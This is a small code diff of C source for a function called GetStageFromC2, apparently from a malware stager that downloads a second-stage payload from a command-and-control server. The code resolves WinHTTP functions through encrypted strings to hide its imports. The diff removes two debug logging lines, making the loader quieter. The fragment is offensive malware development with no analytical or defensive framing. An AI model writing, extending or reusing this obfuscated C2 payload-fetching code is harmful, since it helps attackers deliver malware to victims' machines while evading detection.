@@ -106,7 +106,6 @@ CHAR* GetStageFromC2(DWORD* sSize)
 
     if (bResults)
     {
-        DEBUG("made callback");
         WinHttpReceiveResponse_ rWinHttpReceiveResponse = (WinHttpReceiveResponse_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
                                                                                                               decrypt_string(STRING_WINHTTP_RECVRES, STRING_WINHTTP_RECVRES_KEY));
 
@@ -121,7 +120,6 @@ CHAR* GetStageFromC2(DWORD* sSize)
 
             if (!rWinHttpQueryDataAvailable( hRequest, &dwSize))
             {
-                DEBUG( "Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
                 break;
             }
 
